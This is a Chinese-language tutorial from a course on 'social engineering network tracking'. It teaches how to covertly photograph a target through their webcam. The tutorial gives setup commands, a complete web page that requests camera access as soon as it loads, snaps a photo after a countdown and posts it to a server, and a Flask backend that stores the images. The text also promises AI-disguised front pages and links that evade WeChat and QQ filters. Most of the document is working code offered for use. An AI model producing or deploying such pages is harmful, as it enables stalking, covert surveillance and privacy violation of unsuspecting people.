#### 偷偷获取对方摄像头拍照上传 |《社会工程学之网络追踪》第四节

****

学会本节可获得如下技能：

•利用AI深度伪装前端页面

•获取对方素颜自拍照上传到系统

•腾讯微信QQ不风控链接

****

视频讲解：https://youtu.be/c3_T7UH6u-8

成为我的VIP会员： https://www.youtube.com/@MeeGooBoo/join

> 四、《社会工程学之网络追踪》获取对方素颜自拍照.pptx 

本节课的PPT下载地址：https://github.com/MeeGooBoo/2025/blob/main/9/13/%E5%9B%9B%E3%80%81%E3%80%8A%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6%E4%B9%8B%E7%BD%91%E7%BB%9C%E8%BF%BD%E8%B8%AA%E3%80%8B-%E8%8E%B7%E5%8F%96%E5%AF%B9%E6%96%B9%E7%B4%A0%E9%A2%9C%E8%87%AA%E6%8B%8D%E7%85%A7.pptx

**点击右上角的三个点即可看到下载按钮**

****

腾讯构建：https://cnb.cool/

二维码工具：https://cli.im/

```
apt update
```

```
apt install python3 python3-pip
```

```
pip install --break-system-packages flask requests
```

templates/index.html

```
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>自动拍照上传系统</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
            text-align: center;
            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
            min-height: 100vh;
        }
        .container {
            background-color: white;
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
            padding: 30px;
            margin-top: 30px;
        }
        h1 {
            color: #2c3e50;
            margin-bottom: 10px;
        }
        .description {
            color: #7f8c8d;
            margin-bottom: 30px;
            font-size: 16px;
        }
        .camera-container {
            margin: 20px auto;
            width: 100%;
            max-width: 640px;
            position: relative;
        }
        #video {
            width: 100%;
            background-color: #000;
            border-radius: 8px;
            transform: scaleX(-1); /* 镜像翻转，让视频更像镜子 */
        }
        #canvas {
            display: none;
        }
        .status {
            margin: 20px 0;
            padding: 15px;
            border-radius: 8px;
            font-weight: 500;
        }
        .status-initial {
            background-color: #d6eaf8;
            color: #2874a6;
        }
        .status-success {
            background-color: #d5f5e3;
            color: #1e8449;
        }
        .status-error {
            background-color: #fadbd8;
            color: #c0392b;
        }
        .status-warning {
            background-color: #fef5e7;
            color: #7d6608;
        }
        .photo-preview {
            margin: 20px auto;
            max-width: 100%;
            border-radius: 8px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
        }
        .countdown {
            font-size: 72px;
            color: #e74c3c;
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            text-shadow: 2px 2px 10px rgba(0, 0, 0, 0.5);
            opacity: 0;
            transition: opacity 0.3s;
        }
        .progress-bar {
            height: 6px;
            width: 0%;
            background-color: #3498db;
            border-radius: 3px;
            margin: 10px auto;
            transition: width 0.5s;
        }
        .retry-btn {
            margin-top: 20px;
            padding: 12px 25px;
            background-color: #3498db;
            color: white;
            border: none;
            border-radius: 50px;
            cursor: pointer;
            font-size: 16px;
            font-weight: 600;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            transition: all 0.3s;
        }
        .retry-btn:hover {
            background-color: #2980b9;
            transform: translateY(-2px);
            box-shadow: 0 6px 8px rgba(0, 0, 0, 0.15);
        }
        .retry-btn:active {
            transform: translateY(0);
        }
        .icon {
            font-size: 48px;
            margin-bottom: 20px;
        }
        .permission-help {
            text-align: left;
            background-color: #f9f9f9;
            padding: 15px;
            border-radius: 8px;
            margin: 20px 0;
            border-left: 4px solid #3498db;
        }
        .permission-help h3 {
            margin-top: 0;
            color: #2c3e50;
        }
        .permission-help ol {
            padding-left: 20px;
        }
        .permission-help li {
            margin-bottom: 10px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>自动拍照上传系统</h1>
        <p class="description">页面加载后将自动请求摄像头权限，获取成功后会自动拍照并上传</p>
        
        <div class="camera-container">
            <video id="video" autoplay playsinline></video>
            <div id="countdown" class="countdown">3</div>
            <canvas id="canvas"></canvas>
        </div>
        
        <div class="progress-bar" id="progressBar"></div>
        
        <div id="status" class="status status-initial">
            <div class="icon">📷</div>
            <p>正在请求摄像头权限...</p>
        </div>
        
        <div id="permissionHelp" class="permission-help" style="display: none;">
            <h3>需要摄像头权限</h3>
            <p>您拒绝了摄像头访问权限。要使用此功能，请按照以下步骤操作：</p>
            <ol>
                <li>点击浏览器地址栏左侧的摄像头图标或锁形图标</li>
                <li>将摄像头权限从"拒绝"更改为"允许"</li>
                <li>点击下方的"重试"按钮重新尝试</li>
            </ol>
        </div>
        
        <img id="preview" class="photo-preview" />
        
        <button id="retryBtn" class="retry-btn" style="display: none;">重试</button>
    </div>
    
    <script>
        // 获取DOM元素
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const statusDiv = document.getElementById('status');
        const previewImg = document.getElementById('preview');
        const countdownDiv = document.getElementById('countdown');
        const progressBar = document.getElementById('progressBar');
        const retryBtn = document.getElementById('retryBtn');
        const permissionHelp = document.getElementById('permissionHelp');
        
        let stream = null;
        let isPermissionDenied = false;
        
        // 更新状态显示
        function updateStatus(message, type, icon) {
            statusDiv.innerHTML = icon ? `<div class="icon">${icon}</div><p>${message}</p>` : `<p>${message}</p>`;
            statusDiv.className = `status status-${type}`;
        }
        
        // 显示倒计时
        function showCountdown(seconds, callback) {
            countdownDiv.textContent = seconds;
            countdownDiv.style.opacity = '1';
            
            let count = seconds;
            const countdownInterval = setInterval(() => {
                count--;
                if (count > 0) {
                    countdownDiv.textContent = count;
                } else {
                    clearInterval(countdownInterval);
                    countdownDiv.style.opacity = '0';
                    callback();
                }
            }, 1000);
        }
        
        // 检查摄像头权限状态
        async function checkCameraPermission() {
            try {
                const permissionStatus = await navigator.permissions.query({ name: 'camera' });
                
                if (permissionStatus.state === 'denied') {
                    isPermissionDenied = true;
                    showPermissionDenied();
                    return false;
                }
                
                return true;
            } catch (error) {
                console.error('检查权限时出错:', error);
                return true; // 如果检查失败，继续尝试获取摄像头
            }
        }
        
        // 显示权限被拒绝的提示
        function showPermissionDenied() {
            updateStatus("摄像头权限已被拒绝", "error", "❌");
            permissionHelp.style.display = 'block';
            retryBtn.style.display = 'block';
            retryBtn.textContent = '重试';
        }
        
        // 自动拍照流程
        async function autoCapture() {
            // 先检查权限状态
            const hasPermission = await checkCameraPermission();
            if (!hasPermission) {
                return;
            }
            
            try {
                updateStatus("正在请求摄像头权限...", "initial", "📷");
                
                // 请求摄像头访问权限
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { width: 640, height: 480 }, 
                    audio: false 
                });
                
                // 重置权限拒绝状态
                isPermissionDenied = false;
                permissionHelp.style.display = 'none';
                
                video.srcObject = stream;
                
                updateStatus("摄像头已启动，准备拍照...", "initial", "👍");
                
                // 等待2秒让摄像头稳定
                await new Promise(resolve => setTimeout(resolve, 2000));
                
                // 显示3秒倒计时
                showCountdown(3, () => {
                    // 拍照
                    const context = canvas.getContext('2d');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    // 转换为数据URL
                    const imageData = canvas.toDataURL('image/png');
                    previewImg.src = imageData;
                    
                    // 停止视频流
                    if (stream) {
                        stream.getTracks().forEach(track => track.stop());
                    }
                    
                    // 上传到服务器
                    uploadPhoto(imageData);
                });
                
            } catch (err) {
                if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
                    isPermissionDenied = true;
                    showPermissionDenied();
                } else {
                    updateStatus(`无法访问摄像头: ${err.message}`, "error", "❌");
                    retryBtn.style.display = 'block';
                }
            }
        }
        
        // 上传照片
        function uploadPhoto(imageData) {
            updateStatus("正在上传照片...", "initial", "⏫");
            
            // 模拟上传进度
            let progress = 0;
            const progressInterval = setInterval(() => {
                progress += 5;
                progressBar.style.width = `${progress}%`;
                if (progress >= 100) {
                    clearInterval(progressInterval);
                }
            }, 100);
            
            fetch('/capture', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ image: imageData })
            })
            .then(response => response.json())
            .then(data => {
                clearInterval(progressInterval);
                progressBar.style.width = '100%';
                
                if (data.status === 'success') {
                    updateStatus(`照片上传成功! 文件名: ${data.filename}`, "success", "✅");
                } else {
                    updateStatus(`上传失败: ${data.message}`, "error", "❌");
                    retryBtn.style.display = 'block';
                }
            })
            .catch(error => {
                clearInterval(progressInterval);
                progressBar.style.width = '100%';
                updateStatus(`上传错误: ${error.message}`, "error", "❌");
                retryBtn.style.display = 'block';
            });
        }
        
        // 重试按钮事件
        retryBtn.addEventListener('click', () => {
            retryBtn.style.display = 'none';
            progressBar.style.width = '0%';
            previewImg.src = '';
            
            if (isPermissionDenied) {
                // 如果权限被拒绝，提示用户更改设置后重试
                updateStatus("请更改摄像头权限设置后点击重试", "warning", "⚠️");
                retryBtn.style.display = 'block';
            } else {
                // 其他错误，重新尝试拍照
                autoCapture();
            }
        });
        
        // 页面加载完成后自动开始
        window.addEventListener('load', autoCapture);
        
        // 监听权限变化
        if (navigator.permissions) {
            navigator.permissions.query({ name: 'camera' }).then(permissionStatus => {
                permissionStatus.onchange = function() {
                    if (this.state === 'granted') {
                        isPermissionDenied = false;
                        permissionHelp.style.display = 'none';
                        retryBtn.click(); // 自动重试
                    }
                };
            });
        }
    </script>
</body>
</html>
```

处理上传

```
from flask import Flask, render_template, request, jsonify
import os
from datetime import datetime
import base64

app = Flask(__name__)
app.config['UPLOAD_FOLDER'] = 'uploads'
app.config['MAX_CONTENT_LENGTH'] = 5 * 1024 * 1024  # 限制上传大小为5MB

# 确保上传目录存在
if not os.path.exists(app.config['UPLOAD_FOLDER']):
    os.makedirs(app.config['UPLOAD_FOLDER'])

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/capture', methods=['POST'])
def capture():
    try:
        # 获取base64编码的图像数据
        data = request.get_json()
        image_data = data['image'].split(',')[1]  # 去掉data:image/png;base64,前缀
        
        # 解码并保存图像
        img_data = base64.b64decode(image_data)
        
        # 生成文件名
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"photo_{timestamp}.png"
        filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        
        # 保存文件
        with open(filepath, 'wb') as f:
            f.write(img_data)
            
        return jsonify({'status': 'success', 'message': '照片上传成功!', 'filename': filename})
    
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)})

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
```



****

****

#### 攻防无绝对，技术无好坏，在非安全的信息时代，众人皆在囚笼之中，关注牛马小试，让你一飞冲天！

****

- **Telegram(文件资源频道)：https://t.me/NiuMaXiaoShi**
- **Youtube：  https://www.youtube.com/@MeeGooBoo**
- **Twitter ( X ）：  https://x.com/MeeGooBoo**

****

- ###### 需要联系我？请通过：https://t.me/MeeGooBoo
- 如需购买钻石、铂金、黄金相关珠宝首饰的，请加我微信：Aioa700
- 注：本人不参与任何涉政相关讨论，本人所有平台和内容仅供技术相关领域学习交流使用。

****

>  [!CAUTION]
>
> 本仓库所有内容均来自互联网公开内容或本仓库所有者创作，请勿相信资源中的广告，主动联系你的都是骗子，提高智商谨防上当受诈！请勿利用本仓库实施违反任何适用法律法规等犯罪活动！本仓库所有者不对因使用本仓库内容导致的任何后果承担责任！

****

## 你的赞助是功德无量💰

>  [!NOTE]
>
> 如果你觉得本仓库对你有帮助，你可以赞助我们一杯咖啡，鼓励我们继续维护下去。<br>
> 成为我的Patreon会员：https://www.patreon.com/MeeGooBoo/membership<br>
> 通过Paypal支持我：https://paypal.me/MoGuoBiao<br>
> 通过比特币支持我：bc1qkwrq5plek62fmfaynyphfuuepm6cxd4fsh5wrp



<p align="center" >
    <img src="https://raw.githubusercontent.com/MeeGooBoo/2025/refs/heads/main/static/imgs/logo.png" width="150">
    <h3 align="center">牛马小试(莫国标)</h3>
    <p align="center">
        <img src="https://raw.githubusercontent.com/MeeGooBoo/2025/refs/heads/main/static/imgs/pays.png">
    </p>
</p>


****

